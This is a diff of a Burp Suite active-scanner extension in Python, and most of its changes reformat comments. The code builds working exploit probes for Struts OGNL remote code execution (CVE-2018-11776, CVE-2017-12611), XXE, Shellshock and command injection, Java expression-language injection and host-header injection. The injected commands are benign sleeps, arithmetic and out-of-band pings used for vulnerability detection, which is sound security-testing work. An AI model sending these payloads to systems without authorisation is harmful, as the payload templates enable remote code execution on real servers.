-        interactions = collab.fetchAllCollaboratorInteractions() # Check for collaboration
+        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req) #Issue the actual request
+        interactions = collab.fetchAllCollaboratorInteractions() #Check for collaboration
 
         if interactions:
             return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
@@ -295,18 +347,18 @@ class PerRequestScans(IScannerCheck):
         return []
 
     
-# Based on vulnerability discovered by Man Yue Mo: https://lgtm.com/blog/apache_struts_CVE-2018-11776
-# Tested against instance set up like https://github.com/xfox64x/CVE-2018-11776
+#Based on vulnerability discovered by Man Yue Mo: https://lgtm.com/blog/apache_struts_CVE-2018-11776
+#Tested against instance set up like https://github.com/xfox64x/CVE-2018-11776
     def doStruts_2018_11776_Scan(self, basePair):
 
-        # Don't bother if it isn't a 302 response
+        #Don't bother if it isn't a 302 response
         origResponse = safe_bytes_to_string(basePair.getResponse())
         if (origResponse.find('302 Found') < 0):
             return[]
         
         path = helpers.analyzeRequest(basePair).getUrl().getPath()
         last_slash = 0
-        # The exploit depends upon injecting OGNL into the path of a vulnerable action, so we find
+        #The exploit depends upon injecting OGNL into the path of a vulnerable action, so we find
         #the last slash in the URL and insert our payload
         for i in range(len(path)):
             if path[i] == '/':
@@ -314,18 +366,18 @@ class PerRequestScans(IScannerCheck):
 
         x = random.randint(999, 9999)
         y = random.randint(999, 9999)
-        # The payload here is a simple math(s) problem - because multiplication platform-agnostic
+        #The payload here is a simple math(s) problem - because multiplication platform-agnostic
         attack_string = "/$%7B("+str(x)+"*"+str(y)+")%7D"
         attack_path = path[:last_slash]+attack_string+path[last_slash:]
 
         newReq = safe_bytes_to_string(basePair.getRequest()).replace(path,attack_path, 1)
         debug_msg('  The outgoing 2018-11776 request looks like:\n\n' + newReq + '\n')
-        attack = callbacks.makeHttpRequest(basePair.getHttpService(), newReq) # Issue the actual request
+        attack = callbacks.makeHttpRequest(basePair.getHttpService(), newReq) #Issue the actual request
         asciiResponse = "".join(map(chr,attack.getResponse()))
 
-        # If the response includes the payload product, system is vulnerable
+        #If the response includes the payload product, system is vulnerable
         if str(x*y) in asciiResponse:
-            # Add highlighting so the factors (request) and product (response) are easy to identify
+            #Add highlighting so the factors (request) and product (response) are easy to identify
             requestMarkers = [jarray.array([newReq.find(str(x)+'*'+str(y)), newReq.find(str(x)+'*'+str(y))
                 + len(str(x)+'*'+str(y))],'i')]
             responseMarkers = [jarray.array([asciiResponse.find(str(x*y)), asciiResponse.find(str(x*y)) +
@@ -340,8 +392,8 @@ class PerRequestScans(IScannerCheck):
 
 
 
-# Based on the plethora of XXE attacks at https://web-in-security.blogspot.it/2016/03/xxe-cheat-sheet.html
-# Tested against https://pentesterlab.com/exercises/play_xxe
+#Based on the plethora of XXE attacks at https://web-in-security.blogspot.it/2016/03/xxe-cheat-sheet.html
+#Tested against https://pentesterlab.com/exercises/play_xxe
     def doXXEPostScan(self, basePair):
         if '"type":"none"' in callbacks.saveConfigAsJson("project_options.misc.collaborator_server"):
             return []
@@ -356,34 +408,34 @@ class PerRequestScans(IScannerCheck):
         (ignore, req) = setHeader(basePair.getRequest(), 'Content-Type', "text/xml", True)
         (ignore, req) = setHeader(req, 'Content-Length', str(len(xxepayload)), True)
 
-        ascii_req = '' # make a copy of the request in ASCII for easier processing
+        ascii_req = '' #make a copy of the request in ASCII for easier processing
         for byte in req:
             ascii_req += chr(byte)
 
         if ascii_req.find('\r\n\r\n') > 1:
-            # print('Found \\r\\n\\r\\n at position '+str(ascii_req.find('\r\n\r\n'))+'; stripping all after\n')
-            req = req[:ascii_req.find('\r\n\r\n')+4] # strip off any existing message body
+            #print('Found \\r\\n\\r\\n at position '+str(ascii_req.find('\r\n\r\n'))+'; stripping all after\n')
+            req = req[:ascii_req.find('\r\n\r\n')+4] #strip off any existing message body
         elif ascii_req.find('\n\n') > 1:
-            # print('Found \\n\\n at position '+str(ascii_req.find('\n\n'))+'; stripping all after\n')
-            req = req[:ascii_req.find('\n\n')+2] # strip off any existing message body
+            #print('Found \\n\\n at position '+str(ascii_req.find('\n\n'))+'; stripping all after\n')
+            req = req[:ascii_req.find('\n\n')+2] #strip off any existing message body
 
-        for chars in xxepayload: # add the payload as the message body
+        for chars in xxepayload: #add the payload as the message body
             req.append(ord(chars))
 
-        if req[0] == 71:        # if the reqest starts with G(ET)
-            req = req[3:]    # trim GET...
+        if req[0] == 71:        #if the reqest starts with G(ET)
+            req = req[3:]    #trim GET...
             i = 0
-            for b in [80,79,83,84]:    # and slip in POST
+            for b in [80,79,83,84]:    #and slip in POST
                 req.insert(i,b)
                 i += 1
 
-        ascii_req = '' # recreate the ASCII request for output to Extender console
+        ascii_req = '' #recreate the ASCII request for output to Extender console
         for byte in req:
             ascii_req += chr(byte)
         debug_msg('  The outgoing XXEPostScan request looks like:\n\n' + ascii_req + '\n')
 
-        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req) # Issue the actual request
-        interactions = collab.fetchAllCollaboratorInteractions() # Check for collaboration
+        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req) #Issue the actual request
+        interactions = collab.fetchAllCollaboratorInteractions() #Check for collaboration
 
         if interactions:
             return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
@@ -405,7 +457,7 @@ class PerRequestScans(IScannerCheck):
                 zml_resp, zml_req = self._codepath_attack(basePair, 'application/zml')
                 assert zml_resp != -1
                 if zml_resp != xml_resp:
-                    # Trigger a passive scan on the new response for good measure
+                    #Trigger a passive scan on the new response for good measure
                     launchPassiveScan(xml_req)
                     return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                                             [basePair, xml_req, zml_req],
@@ -434,24 +486,24 @@ class PerRequestScans(IScannerCheck):
         base_resp_print = tagmap(base_resp_string)
         rawHeaders = helpers.analyzeRequest(basePair.getRequest()).getHeaders()
 
-        # Parse the headers into a dictionary
+        #Parse the headers into a dictionary
         headers = dict((header.split(': ')[0].upper(), header.split(': ', 1)[1]) for header in rawHeaders[1:])
 
-        # If the request doesn't use the host header, bail
+        #If the request doesn't use the host header, bail
         if ('HOST' not in headers.keys()):
             return []
 
-        # If the response doesn't reflect the host header we can't identify successful attacks
+        #If the response doesn't reflect the host header we can't identify successful attacks
         if (headers['HOST'] not in base_resp_string):
             debug_msg("Skipping host header attacks on this request as the host isn't reflected")
             return []
 
-        # prepare the attack
+        #prepare the attack
         request = safe_bytes_to_string(basePair.getRequest())
         request = request.replace('$', '\$')
         request = request.replace('/', '$abshost/', 1)
 
-        # add a cachebust parameter
+        #add a cachebust parameter
         if ('?' in request[0:request.index('\n')]):
             request = re.sub('(?i)([a-z]+ [^ ]+)', r'\1&cachebust=${cachebust}', request, 1)
         else:
@@ -470,17 +522,17 @@ class PerRequestScans(IScannerCheck):
         request_template = Template(request)
 
 
-        # Send several requests with invalid host headers and observe whether they reach the target application, and whether the host header is reflected
+        #Send several requests with invalid host headers and observe whether they reach the target application, and whether the host header is reflected
         legit = headers['HOST']
         taint = randstr(6)
         taint += '.' + legit
         issues = []
 
-        # Host: evil.legit.com
+        #Host: evil.legit.com
         (attack, resp) = self._attack(basePair, {'host': taint}, taint, request_template, referer)
         if hit(resp, base_resp_print):
 
-            # flag DNS-rebinding if the page actually has content
+            #flag DNS-rebinding if the page actually has content
             if base_resp_print != '':
                 issues.append(self._raise(basePair, attack, 'dns'))
 
@@ -488,15 +540,15 @@ class PerRequestScans(IScannerCheck):
                 issues.append(self._raise(basePair, attack, 'host'))
                 return issues
         else:
-            # The application might not be the default VHost, so try an absolute URL:
-            #	GET http://legit.com/foo
-            #	Host: evil.com
+            #The application might not be the default VHost, so try an absolute URL:
+            ##GET http://legit.com/foo
+            ##Host: evil.com
             (attack, resp) = self._attack(basePair, {'abshost': legit, 'host': taint}, taint, request_template, referer)
             if hit(resp, base_resp_print) and taint in resp and referer not in resp:
                 issues.append(self._raise(basePair, attack, 'abs'))
 
-        # Host: legit.com
-        #	X-Forwarded-Host: evil.com
+        #Host: legit.com
+        ##X-Forwarded-Host: evil.com
         (attack, resp) = self._attack(basePair, {'host': legit, 'xfh': taint}, taint, request_template, referer)
         if hit(resp, base_resp_print) and taint in resp and referer not in resp:
             issues.append(self._raise(basePair, attack, 'xfh'))
@@ -545,7 +597,7 @@ class PerRequestScans(IScannerCheck):
             payloads['abshost'] = proto + payloads['abshost']
         payloads['referer'] = proto + taint + '/' + referer
 
-        # Load the supplied payloads into the request
+        #Load the supplied payloads into the request
         if 'xfh' in payloads:
             payloads['xfh'] = "\r\nX-Forwarded-Host: " + payloads['xfh']
 
@@ -553,7 +605,7 @@ class PerRequestScans(IScannerCheck):
             if key not in payloads:
                 payloads[key] = ''
 
-        # Ensure that the response to our request isn't cached - that could be harmful
+        #Ensure that the response to our request isn't cached - that could be harmful
         payloads['cachebust'] = str(time.time())
 
         request = request_template.substitute(payloads)
@@ -570,8 +622,8 @@ class PerRequestScans(IScannerCheck):
         return attack, response
 
 
-# Ensure that error pages get passively scanned
-# Stacks nicely with the 'Error Message Checks' extension
+#Ensure that error pages get passively scanned
+#Stacks nicely with the 'Error Message Checks' extension
 class SimpleFuzz(IScannerCheck):
     def doActiveScan(self, basePair, insertionPoint):
         attack = request(basePair, insertionPoint, 'a\'a\\\'b"c>?>%}}%%>c<[[?${{%}}cake\\')
@@ -608,7 +660,7 @@ class EdgeSideInclude(IScannerCheck):
 
 
 
-# Detect suspicious input transformations
+#Detect suspicious input transformations
 class SuspectTransform(IScannerCheck):
     def __init__(self):
 
@@ -686,22 +738,22 @@ class SuspectTransform(IScannerCheck):
     def consolidateDuplicateIssues(self, existingIssue, newIssue):
         return is_same_issue(existingIssue, newIssue)
 
-# Based on https://github.com/brianwrf/S2-053-CVE-2017-12611
-# Tested against docker instance at https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053
+#Based on https://github.com/brianwrf/S2-053-CVE-2017-12611
+#Tested against docker instance at https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-053
 class doStruts_2017_12611_scan(IScannerCheck):
     def doActiveScan(self, basePair, insertionPoint):
         collab = callbacks.createBurpCollaboratorClientContext()
 
-        # set the blah blah blah needed before and after the command to be executed
+        #set the blah blah blah needed before and after the command to be executed
         param_pre = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"
         param_post = "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}"
-        collab_payload = collab.generatePayload(True) # create a Collaborator payload
-        command = "ping " + collab_payload + " -c1" # platform-agnostic command to check for RCE via DNS interaction
+        collab_payload = collab.generatePayload(True) #create a Collaborator payload
+        command = "ping " + collab_payload + " -c1" #platform-agnostic command to check for RCE via DNS interaction
         attack_param = param_pre + command + param_post
 
-        attack = request(basePair, insertionPoint, attack_param) # issue the attack request
+        attack = request(basePair, insertionPoint, attack_param) #issue the attack request
         debug_msg(helpers.analyzeRequest(attack).getUrl())
-        interactions = collab.fetchAllCollaboratorInteractions() # Check for collaboration
+        interactions = collab.fetchAllCollaboratorInteractions() #Check for collaboration
         if interactions:
             return [CustomScanIssue(attack.getHttpService(), helpers.analyzeRequest(attack).getUrl(), [attack],
                 'Struts2 CVE-2017-12611 RCE',
@@ -756,8 +808,8 @@ class Solr(IScannerCheck):
     def consolidateDuplicateIssues(self, existingIssue, newIssue):
         return is_same_issue(existingIssue, newIssue)
 
-# Detect CVE-2015-2080
-# Technique based on https://github.com/GDSSecurity/Jetleak-Testing-Script/blob/master/jetleak_tester.py
+#Detect CVE-2015-2080
+#Technique based on https://github.com/GDSSecurity/Jetleak-Testing-Script/blob/master/jetleak_tester.py
 class JetLeak(IScannerCheck):
     def doActiveScan(self, basePair, insertionPoint):
         if 'Referer' != insertionPoint.getInsertionPointName():
@@ -779,29 +831,29 @@ class JetLeak(IScannerCheck):
         return is_same_issue(existingIssue, newIssue)
 
 
-# This extends the active scanner with a number of timing-based code execution checks
-# _payloads contains the payloads, designed to delay the response by $time seconds
-# _extensionMappings defines which payloads get called on which file extensions
+#This extends the active scanner with a number of timing-based code execution checks
+#_payloads contains the payloads, designed to delay the response by $time seconds
+#_extensionMappings defines which payloads get called on which file extensions
 class CodeExec(IScannerCheck):
     def __init__(self):
-        # self._helpers = callbacks.getHelpers()
+        #self._helpers = callbacks.getHelpers()
 
         self._done = getIssues('Code injection')
 
         self._payloads = {
-            # Exploits shell command injection into '$input' on linux and "$input" on windows:
-            # and CVE-2014-6271, CVE-2014-6278
+            #Exploits shell command injection into '$input' on linux and "$input" on windows:
+            #and CVE-2014-6271, CVE-2014-6278
             'any': ['() { :;}; /bin/sleep $time',
                     '() { _; } >_[$$($$())] { /bin/sleep $time; }', '$$(sleep $time)', '`sleep $time`'],
             'php': [],
-            'perl': ['/bin/sleep $time|'],
+            'perl':     ['/bin/sleep $time|'],
             'ruby': ['|sleep $time & ping -n $time localhost'],
-            # Expression language injection
+            #Expression language injection
             'java': [
                 '$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"timeout","$time"})).start()).getInputStream()))).readLine()}$${(new java.io.BufferedReader(new java.io.InputStreamReader(((new java.lang.ProcessBuilder(new java.lang.String[]{"sleep","$time"})).start()).getInputStream()))).readLine()}'],
         }
 
-        # Used to ensure only appropriate payloads are attempted
+        #Used to ensure only appropriate payloads are attempted
         self._extensionMappings = {
             'php5': 'php',
             'php4': 'php',
@@ -816,14 +868,14 @@ class CodeExec(IScannerCheck):
             '': ['php', 'ruby', 'java'],
             'unrecognised': 'java',
 
-            # Code we don't have exploits for
+            #Code we don't have exploits for
             'asp': 'any',
             'aspx': 'any',
         }
 
     def doActiveScan(self, basePair, insertionPoint):
 
-        # Decide which payloads to use based on the file extension, using a set to prevent duplicate payloads          
+        #Decide which payloads to use based on the file extension, using a set to prevent duplicate payloads          
         payloads = set()
         languages = self._getLangs(basePair)
         for lang in languages:
@@ -831,8 +883,8 @@ class CodeExec(IScannerCheck):
             payloads |= set(new_payloads)
         payloads.update(self._payloads['any'])
 
-        # Time how long each response takes compared to the baseline
-        # Assumes <4 seconds jitter
+        #Time how long each response takes compared to the baseline
+        #Assumes <4 seconds jitter
         baseTime = 0
         for payload in payloads:
             if (baseTime == 0):
@@ -879,7 +931,7 @@ class CodeExec(IScannerCheck):
     def _attack(self, basePair, insertionPoint, payload, sleeptime):
         payload = Template(payload).substitute(time=sleeptime)
 
-        # Use a hack to time the request. This information should be accessible via the API eventually.
+        #Use a hack to time the request. This information should be accessible via the API eventually.
         timer = time.time()
         attack = request(basePair, insertionPoint, payload)
         timer = time.time() - timer
@@ -993,7 +1045,7 @@ class BasicAuthInsertionPoint(IScannerInsertionPoint):
         return IScannerInsertionPoint.INS_EXTENSION_PROVIDED
 
 
-# misc utility methods
+#misc utility methods
 
 def launchPassiveScan(attack):
     if attack.getResponse() is None:
@@ -1038,7 +1090,7 @@ def anchor_change(probe, expect):
         expected.append(left + x + right)
     return probe, expected
 
-# currently unused as .getUrl() ignores the query string
+#currently unused as .getUrl() ignores the query string
 def issuesMatch(existingIssue, newIssue):
     if (existingIssue.getUrl() == newIssue.getUrl() and existingIssue.getIssueName() == newIssue.getIssueName()):
         return -1
@@ -1068,7 +1120,7 @@ def debug_msg(message):
 
 
 def setHeader(request, name, value, add_if_not_present=False):
-    # find the end of the headers
+    #find the end of the headers
     prev = ''
     i = 0
     while i < len(request):
@@ -1081,7 +1133,7 @@ def setHeader(request, name, value, add_if_not_present=False):
         i += 1
     body_start = i
 
-    # walk over the headers and change as appropriate
+    #walk over the headers and change as appropriate
     headers = safe_bytes_to_string(request[0:body_start])
     headers = headers.splitlines()
     modified = False
@@ -1094,11 +1146,11 @@ def setHeader(request, name, value, add_if_not_present=False):
                 headers[i] = new_value
                 modified = True
 
-    # stitch the request back together
+    #stitch the request back together
     if modified:
         modified_request = helpers.stringToBytes('\r\n'.join(headers) + '\r\n') + request[body_start:]
     elif add_if_not_present:
-        # probably doesn't work with POST requests
+        #probably doesn't work with POST requests
         real_start = helpers.analyzeRequest(request).getBodyOffset()
         modified_request = request[:real_start-2] + helpers.stringToBytes(name + ': ' + value + '\r\n\r\n') + request[real_start:]
     else:
